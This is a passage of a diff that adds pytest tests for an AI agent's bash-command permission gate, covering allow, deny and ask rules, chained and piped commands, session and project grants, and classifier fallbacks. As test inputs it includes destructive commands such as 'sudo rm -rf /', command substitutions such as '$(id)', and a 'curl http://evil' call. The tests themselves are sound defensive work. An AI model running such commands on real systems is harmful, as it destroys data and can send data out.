+        approved = await hooks._request_user_confirmation("skills", "deep-analysis", self._ctx({}))
+
+        assert approved is False
+        event = mock_broker.request.call_args.args[0][0]
+        assert "**Arguments**" not in event.content
+        assert "Permission Request" in event.content
+
+
+class BashHooksMixin:
+    """Shared ``bash_tools.bash`` gate fixtures for the bash permission suites.
+
+    One copy of the builders instead of one per test class, so a
+    ``PermissionHooks`` constructor change lands in a single place. Every
+    keyword defaults to the value the classes were passing implicitly, so
+    inheriting is behaviour-preserving.
+    """
+
+    def _make_hooks(
+        self,
+        mock_broker,
+        bash_commands=None,
+        rules=None,
+        non_interactive=False,
+        project_root=None,
+        config_mutable=True,
+        bash_classifier=None,
+        default=PermissionLevel.ASK,
+    ):
+        from datus.tools.permission.bash_rules import BashCommandRules
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        config = PermissionConfig(
+            default_permission=default,
+            rules=rules
+            if rules is not None
+            else [PermissionRule(tool="bash_tools", pattern="bash", permission=PermissionLevel.ASK)],
+            bash_commands=BashCommandRules(**bash_commands) if isinstance(bash_commands, dict) else bash_commands,
+        )
+        manager = PermissionManager(global_config=config)
+        hooks = PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=non_interactive,
+            project_root=project_root,
+            config_mutable=config_mutable,
+            bash_classifier=bash_classifier,
+        )
+        return hooks, manager
+
+    @staticmethod
+    def _ctx(command):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps({"command": command})
+        return ctx
+
+    @staticmethod
+    def _tool():
+        t = MagicMock()
+        t.name = "bash"
+        return t
+
+
+class TestBashCommandPermission(BashHooksMixin):
+    """Command-level gating for ``bash_tools.bash`` via _handle_bash_permission."""
+
+    @pytest.mark.asyncio
+    async def test_allow_rule_bypasses_prompt(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["git log:*"]})
+
+        await hooks.on_tool_start(self._ctx("git log --oneline -5"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_deny_rule_raises_naming_pattern(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["git:*"], "deny": ["git push:*"]})
+
+        with pytest.raises(PermissionDeniedException, match="git push"):
+            await hooks.on_tool_start(self._ctx("git push origin main"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_unanchored_deny_catches_wrapped_command(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"deny": ["rm:*"]})
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("xargs rm -rf build"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_missing_ruleset_falls_back_to_coarse_ask(self, mock_broker):
+        """No bash_commands → legacy behavior: the coarse ASK rule prompts."""
+        hooks, _ = self._make_hooks(mock_broker, bash_commands=None)
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("git log"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_explicit_category_deny_defers_to_main_flow(self, mock_broker):
+        """A coarse bash_tools.bash DENY rule wins over command-level allows."""
+        hooks, _ = self._make_hooks(
+            mock_broker,
+            bash_commands={"allow": ["git log:*"]},
+            rules=[PermissionRule(tool="bash_tools", pattern="bash", permission=PermissionLevel.DENY)],
+        )
+
+        with pytest.raises(PermissionDeniedException, match="blocked by"):
+            await hooks.on_tool_start(self._ctx("git log"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_non_interactive_ask_raises_without_prompt(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["git log:*"]}, non_interactive=True)
+
+        with pytest.raises(PermissionDeniedException, match="non-interactively"):
+            await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_ask_prompts_and_deny_choice_raises(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["n"]])
+
+        with pytest.raises(PermissionDeniedException, match="rejected"):
+            await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_session_allow_buckets_by_prefix(self, mock_broker):
+        """'a' approves the bucket; same bucket skips, different bucket prompts."""
+        hooks, manager = self._make_hooks(mock_broker, bash_commands={"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("git push origin main"), MagicMock(), self._tool())
+        assert manager._session_approvals.get("bash_tools.bash::git push") is True
+
+        # same bucket: no second prompt
+        await hooks.on_tool_start(self._ctx("git push origin dev"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+        # different bucket prompts again
+        await hooks.on_tool_start(self._ctx("git rebase main"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 2
+
+    @pytest.mark.asyncio
+    async def test_project_allow_persists_and_applies(self, mock_broker, tmp_path):
+        """'p' writes .datus/config.yml, updates live config, caches session bucket."""
+        from datus.configuration.project_config import load_project_override
+
+        hooks, manager = self._make_hooks(
+            mock_broker, bash_commands={"allow": ["git log:*"]}, project_root=str(tmp_path)
+        )
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+
+        await hooks.on_tool_start(self._ctx("make test"), MagicMock(), self._tool())
+
+        override = load_project_override(str(tmp_path))
+        assert override.bash_allow == ["make test:*"]
+        assert "make test:*" in manager.global_config.bash_commands.allow
+        # later same-prefix command auto-allows via the live rule (no prompt)
+        await hooks.on_tool_start(self._ctx("make test -j4"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git status && sudo rm -rf /",  # wrapper sub-command
+            "git status && echo $(id)",  # command substitution
+            "git status & rm -rf /",  # background: not segmentable
+        ],
+    )
+    async def test_safety_forced_prompt_offers_no_project_choice(self, mock_broker, command):
+        """One safety-ceiling sub-command withholds 'p' from the whole chain."""
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["git status"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx(command), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+        assert "y" in event.choices and "a" in event.choices and "n" in event.choices
+
+    @pytest.mark.asyncio
+    async def test_ask_rule_hit_offers_no_project_choice(self, mock_broker):
+        """Explicit ask rules mean 'review every time' — no 'p' offered."""
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"ask": ["docker:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("docker ps"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+
+    @pytest.mark.asyncio
+    async def test_unmatched_command_offers_project_choice(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" in event.choices
+
+    @pytest.mark.asyncio
+    async def test_unmatched_command_omits_project_choice_when_config_is_immutable(self, mock_broker):
+        hooks, _ = self._make_hooks(
+            mock_broker,
+            bash_commands={"allow": ["git log:*"]},
+            config_mutable=False,
+        )
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert set(event.choices) == {"y", "a", "n"}
+
+    @pytest.mark.asyncio
+    async def test_classifier_high_confidence_allow_skips_prompt(self, mock_broker):
+        from datus.tools.permission.bash_classifier import BashCommandClassifier, ClassifierVerdict
+
+        class StubClassifier(BashCommandClassifier):
+            async def classify(self, command, context):
+                return ClassifierVerdict(permission=PermissionLevel.ALLOW, confidence=0.95, reason="safe")
+
+        hooks, _ = self._make_hooks(
+            mock_broker, bash_commands={"allow": ["git log:*"]}, bash_classifier=StubClassifier()
+        )
+
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_classifier_low_confidence_falls_through_to_prompt(self, mock_broker):
+        from datus.tools.permission.bash_classifier import BashCommandClassifier, ClassifierVerdict
+
+        class StubClassifier(BashCommandClassifier):
+            async def classify(self, command, context):
+                return ClassifierVerdict(permission=PermissionLevel.ALLOW, confidence=0.3, reason="unsure")
+
+        hooks, _ = self._make_hooks(
+            mock_broker, bash_commands={"allow": ["git log:*"]}, bash_classifier=StubClassifier()
+        )
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_classifier_exception_fails_closed_to_prompt(self, mock_broker):
+        from datus.tools.permission.bash_classifier import BashCommandClassifier
+
+        class BoomClassifier(BashCommandClassifier):
+            async def classify(self, command, context):
+                raise RuntimeError("api down")
+
+        hooks, _ = self._make_hooks(
+            mock_broker, bash_commands={"allow": ["git log:*"]}, bash_classifier=BoomClassifier()
+        )
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_classifier_not_consulted_for_safety_forced(self, mock_broker):
+        from datus.tools.permission.bash_classifier import BashCommandClassifier, ClassifierVerdict
+
+        calls = []
+
+        class StubClassifier(BashCommandClassifier):
+            async def classify(self, command, context):
+                calls.append(command)
+                return ClassifierVerdict(permission=PermissionLevel.ALLOW, confidence=0.99, reason="safe")
+
+        hooks, _ = self._make_hooks(mock_broker, bash_commands={"allow": ["ls:*"]}, bash_classifier=StubClassifier())
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("sudo ls"), MagicMock(), self._tool())
+
+        assert calls == []
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_legacy_classifier_not_consulted_non_interactively(self, mock_broker):
+        from datus.tools.permission.bash_classifier import BashCommandClassifier, ClassifierVerdict
+
+        calls = []
+
+        class StubClassifier(BashCommandClassifier):
+            async def classify(self, command, context):
+                calls.append(command)
+                return ClassifierVerdict(permission=PermissionLevel.ALLOW, confidence=0.99, reason="safe")
+
+        hooks, _ = self._make_hooks(
+            mock_broker,
+            bash_commands={"allow": ["git log:*"]},
+            bash_classifier=StubClassifier(),
+            non_interactive=True,
+        )
+
+        with pytest.raises(PermissionDeniedException, match="non-interactively"):
+            await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        assert calls == []
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_switch_profile_clears_session_but_keeps_project_allows(self, mock_broker, tmp_path):
+        hooks, manager = self._make_hooks(
+            mock_broker, bash_commands={"allow": ["git log:*"]}, project_root=str(tmp_path)
+        )
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+        await hooks.on_tool_start(self._ctx("make test"), MagicMock(), self._tool())
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+        assert manager._session_approvals
+
+        manager.switch_profile("normal")
+
+        assert not manager._session_approvals  # session buckets cleared
+        assert "make test:*" in manager.global_config.bash_commands.allow  # project allow replayed
+
+
+class TestBashDangerousProfileWithUserRules:
+    """User deny/ask lists must not flip dangerous into ask-everything."""
+
+    def _make_hooks(self, mock_broker, non_interactive=True):
+        from datus.tools.permission.profiles import build_effective_config
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        # dangerous profile + user bash rules from agent.yml — the real merge path.
+        config = build_effective_config(
+            "dangerous",
+            {"bash_commands": {"deny": ["rm:*"], "ask": ["docker:*"]}},
+        )
+        manager = PermissionManager(global_config=config, active_profile="dangerous")
+        return PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=non_interactive,
+        )
+
+    @staticmethod
+    def _ctx(command):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps({"command": command})
+        return ctx
+
+    @staticmethod
+    def _tool():
+        t = MagicMock()
+        t.name = "bash"
+        return t
+
+    @pytest.mark.asyncio
+    async def test_unmatched_command_inherits_dangerous_allow(self, mock_broker):
+        hooks = self._make_hooks(mock_broker)
+
+        await hooks.on_tool_start(self._ctx("touch newfile.txt"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_deny_rule_still_blocks_under_dangerous(self, mock_broker):
+        hooks = self._make_hooks(mock_broker)
+
+        with pytest.raises(PermissionDeniedException, match="rm"):
+            await hooks.on_tool_start(self._ctx("rm README.md"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_ask_rule_still_asks_under_dangerous(self, mock_broker):
+        hooks = self._make_hooks(mock_broker)
+
+        with pytest.raises(PermissionDeniedException, match="non-interactively"):
+            await hooks.on_tool_start(self._ctx("docker ps"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_explicit_default_ask_is_respected(self, mock_broker):
+        """A user who explicitly sets default: ask under dangerous gets ask."""
+        from datus.tools.permission.profiles import build_effective_config
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        config = build_effective_config(
+            "dangerous",
+            {"bash_commands": {"deny": ["rm:*"], "default": "ask"}},
+        )
+        manager = PermissionManager(global_config=config, active_profile="dangerous")
+        hooks = PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=True,
+        )
+
+        with pytest.raises(PermissionDeniedException, match="non-interactively"):
+            await hooks.on_tool_start(self._ctx("touch x"), MagicMock(), self._tool())
+
+
+class TestBashPipelinePermission(BashHooksMixin):
+    """Hook-level behavior for pipelines under _handle_bash_permission."""
+
+    @pytest.mark.asyncio
+    async def test_all_allow_pipeline_no_prompt(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["cat:*", "grep:*", "wc:*"]})
+
+        await hooks.on_tool_start(self._ctx("cat log | grep err | wc -l"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_deny_segment_raises(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["cat:*"], "deny": ["rm:*"]})
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("cat x | xargs rm"), MagicMock(), self._tool())
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_unmatched_segment_prompts_with_that_bucket(self, mock_broker):
+        hooks, manager = self._make_hooks(mock_broker, {"allow": ["cat:*"]})
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("cat x | frobnicate"), MagicMock(), self._tool())
+
+        assert manager._session_approvals.get("bash_tools.bash::frobnicate") is True
+
+    @pytest.mark.asyncio
+    async def test_wrapper_segment_safety_no_project_option(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["ls:*", "echo:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("ls | xargs echo"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+
+    @pytest.mark.asyncio
+    async def test_non_interactive_pipeline_ask_raises(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["cat:*"]}, non_interactive=True)
+
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("cat x | frobnicate"), MagicMock(), self._tool())
+
+
+class TestBashChainedCommandPrompt(BashHooksMixin):
+    """A chained command must be shown, approved and persisted per sub-command."""
+
+    @pytest.mark.asyncio
+    async def test_prompt_body_lists_every_sub_command_needing_approval(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git fetch"], "ask": ["npm:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && npm ci"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        # The full command still renders verbatim in a bash fence...
+        assert "```bash\ngit fetch && rm -rf build && npm ci\n```" in event.content
+        # ...and each sub-command needing approval is named individually.
+        assert "2 sub-commands require confirmation" in event.content
+        assert "`rm -rf build`" in event.content
+        assert "`npm ci`" in event.content
+        # The allowed sub-command is not presented as needing approval.
+        assert "`git fetch`" not in event.content
+
+    @pytest.mark.asyncio
+    async def test_choice_labels_name_every_bucket_and_pattern(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git fetch"]}, project_root=None)
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && cargo test"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert event.choices["a"] == "Allow 'rm', 'cargo test' (session)"
+        assert event.choices["p"] == "Allow 'rm:*', 'cargo test:*' (project)"
+
+    @pytest.mark.asyncio
+    async def test_long_chain_label_degrades_to_a_count(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("aa; bb; cc; dd"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert event.choices["a"] == "Allow all 4 sub-commands (session)"
+        # The body still enumerates them, so nothing is hidden by the short label.
+        for name in ("`aa`", "`bb`", "`cc`", "`dd`"):
+            assert name in event.content
+
+    @pytest.mark.asyncio
+    async def test_sub_command_with_backticks_stays_a_valid_code_span(self, mock_broker):
+        """``echo `whoami``` must not close its own inline code span."""
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("frobnicate; echo `whoami`"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        # A two-backtick fence plus padding holds the backticks in the command.
+        assert "`` echo `whoami` ``" in event.content
+        assert "`frobnicate`" in event.content
+        # The safety-forced sub-command is named in full, matching the grant it
+        # actually creates (an exact-command key, not the ``echo`` bucket).
+        assert event.choices["a"] == "Allow 'frobnicate', 'echo `whoami`' (session)"
+
+    @pytest.mark.asyncio
+    async def test_single_sub_command_keeps_the_original_layout(self, mock_broker):
+        """Plain commands must not regress into the multi-sub-command rendering."""
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("cargo build"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "**Reason:**" in event.content
+        assert "sub-commands require confirmation" not in event.content
+        assert event.choices["a"] == "Allow 'cargo build' (session)"
+
+    @pytest.mark.asyncio
+    async def test_session_choice_approves_every_sub_command(self, mock_broker):
+        hooks, manager = self._make_hooks(mock_broker, {"allow": ["git fetch"]})
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && cargo test"), MagicMock(), self._tool())
+
+        assert manager._session_approvals.get("bash_tools.bash::rm") is True
+        assert manager._session_approvals.get("bash_tools.bash::cargo test") is True
+
+        # Re-running the same chain, and each sub-command on its own, is silent.
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && cargo test"), MagicMock(), self._tool())
+        await hooks.on_tool_start(self._ctx("cargo test --release"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_session_approval_does_not_cover_an_unreviewed_sub_command(self, mock_broker):
+        """Approving ``a && b`` must not green-light ``a && c``."""
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git fetch"]})
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("rm -rf build && cargo test"), MagicMock(), self._tool())
+        await hooks.on_tool_start(self._ctx("rm -rf build && curl http://evil"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 2
+
+    @pytest.mark.asyncio
+    async def test_broad_session_approval_still_covers_a_whole_chain(self, mock_broker):
+        """A deliberate wide grant (``bash_tools.bash``) is honored as before.
+
+        Per-sub-command keys tightened the *narrow* path; they must not break
+        the coarse approval a legacy prompt may already have recorded.
+        """
+        hooks, manager = self._make_hooks(mock_broker, {"allow": ["git log:*"]})
+        manager.approve_for_session("bash_tools", "bash")
+
+        await hooks.on_tool_start(self._ctx("rm -rf build && cargo test"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_safety_forced_session_approval_is_scoped_to_the_exact_command(self, mock_broker):
+        """A safety-ceiling bucket (``sudo``) describes nothing about what runs.
+
+        Regression guard: keying the approval on the bucket let ``sudo ls``
+        green-light ``sudo rm -rf ~`` for the rest of the session.
+        """
+        hooks, manager = self._make_hooks(mock_broker, {"allow": ["git log:*"]})
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("sudo ls"), MagicMock(), self._tool())
+        assert manager._session_approvals.get("bash_tools.bash::sudo") is None
+        assert manager._session_approvals.get("bash_tools.bash::exact:sudo ls") is True
+
+        await hooks.on_tool_start(self._ctx("sudo rm -rf /tmp/x"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 2
+
+    @pytest.mark.asyncio
+    async def test_project_choice_persists_one_pattern_per_sub_command(self, mock_broker, tmp_path):
+        from datus.configuration.project_config import load_project_override
+
+        hooks, manager = self._make_hooks(mock_broker, {"allow": ["git fetch"]}, project_root=str(tmp_path))
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && cargo test"), MagicMock(), self._tool())
+
+        override = load_project_override(str(tmp_path))
+        # Both patterns land on disk; the writer's insert-after-key placement
+        # decides their order, so compare as a set.
+        assert set(override.bash_allow) == {"rm:*", "cargo test:*"}
+        assert len(override.bash_allow) == 2
+        for pattern in ("rm:*", "cargo test:*"):
+            assert pattern in manager.global_config.bash_commands.allow
+
+    @pytest.mark.asyncio
+    async def test_project_choice_makes_the_chain_idempotent_across_sessions(self, mock_broker, tmp_path):
+        """A fresh manager loading the persisted grants must not re-prompt.
+
+        Previously only the representative sub-command was persisted, so each
+        later session re-prompted once per remaining sub-command.
+        """
+        from datus.configuration.project_config import load_project_override
+
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git fetch"]}, project_root=str(tmp_path))
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && cargo test"), MagicMock(), self._tool())
+
+        # Simulate a restart: rebuild from the persisted project override only.
+        persisted = load_project_override(str(tmp_path)).bash_allow
+        fresh_broker = MagicMock()
+        fresh_broker.request = AsyncMock(return_value=[["n"]])
+        fresh_hooks, _ = self._make_hooks(
+            fresh_broker,
+            {"allow": ["git fetch", *persisted]},
+            project_root=str(tmp_path),
+        )
+
+        await fresh_hooks.on_tool_start(self._ctx("git fetch && rm -rf build && cargo test"), MagicMock(), self._tool())
+        fresh_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_user_authored_ask_sub_command_withholds_project_choice(self, mock_broker):
+        """One user-authored ask rule in the chain removes 'p' for all of it."""
+        hooks, _ = self._make_hooks(mock_broker, {"allow": ["git fetch"], "ask": ["npm:*"]})
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("git fetch && rm -rf build && npm ci"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+
+
+class TestPluginCliBashPermission:
+    """End-to-end: plugin-declared CLI rules gate ``datus <plugin> ...`` commands."""
+
+    def _make_hooks(self, mock_broker, project_bash_allows=None, non_interactive=False):
+        from datus.tools.permission.bash_rules import BashCommandRules
+        from datus.tools.permission.profiles import build_effective_config
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        plugin_rules = BashCommandRules(
+            allow=["datus hello greet:*"],
+            ask=["datus hello config set:*"],
+            deny=["datus hello config wipe:*"],
+        )
+        config = build_effective_config("normal", None, plugin_bash_rules=plugin_rules)
+        manager = PermissionManager(
+            global_config=config,
+            active_profile="normal",
+            plugin_bash_rules={"normal": plugin_rules},
+            project_bash_allows=project_bash_allows,
+        )
+        hooks = PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=non_interactive,
+        )
+        return hooks, manager
+
+    @staticmethod
+    def _ctx(command):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps({"command": command})
+        return ctx
+
+    @staticmethod
+    def _tool():
+        t = MagicMock()
+        t.name = "bash"
+        return t
+
+    @pytest.mark.asyncio
+    async def test_plugin_allow_rule_bypasses_prompt(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker)
+
+        await hooks.on_tool_start(self._ctx("datus hello greet Ada"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_plugin_ask_rule_prompts_with_pattern_bucket(self, mock_broker):
+        hooks, manager = self._make_hooks(mock_broker)
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+        event = mock_broker.request.await_args.args[0][0]
+        # Ask-rule hit: the session bucket is the matched pattern. Because the
+        # ask rule is PLUGIN-declared, the project-persist option IS offered.
+        assert "datus hello config set:*" in event.choices["a"]
+        assert "p" in event.choices
+        assert "datus hello config set:*" in event.choices["p"]
+        assert manager._session_approvals.get("bash_tools.bash::datus hello config set:*") is True
+
+        # Same bucket: second call skips the prompt.
+        await hooks.on_tool_start(self._ctx("datus hello config set tone loud"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_plugin_deny_rule_raises(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker)
+
+        with pytest.raises(PermissionDeniedException, match="datus hello config wipe"):
+            await hooks.on_tool_start(self._ctx("datus hello config wipe all"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_unmatched_plugin_command_asks_with_namespace_bucket(self, mock_broker):
+        hooks, manager = self._make_hooks(mock_broker)
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("datus other doit"), MagicMock(), self._tool())
+
+        # No rule matched: session bucket is the two-token group ``datus other``,
+        # so approving it never green-lights ``datus hello``.
+        assert manager._session_approvals.get("bash_tools.bash::datus other") is True
+        mock_broker.request = AsyncMock(return_value=[["n"]])
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("datus hello config set x y"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_plugin_ask_project_choice_persists_pattern_verbatim(self, mock_broker):
+        from unittest.mock import patch
+
+        hooks, manager = self._make_hooks(mock_broker)
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+
+        with patch("datus.configuration.project_config.append_project_bash_allow") as persist:
+            await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        # The matched ask pattern is persisted verbatim (already contains ':').
+        persist.assert_called_once()
+        assert persist.call_args.args[0] == "datus hello config set:*"
+        assert manager.has_project_bash_grant("datus hello config set:*")
+
+        # Same command later this session: no prompt (session bucket + grant).
+        await hooks.on_tool_start(self._ctx("datus hello config set tone loud"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_project_grant_bypasses_plugin_ask_after_restart(self, mock_broker):
+        """A persisted grant loaded from .datus/config.yml silences the ask rule."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_project_grant_bypasses_ask_even_non_interactive(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"], non_interactive=True)
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_project_grant_is_exact_match_only(self, mock_broker):
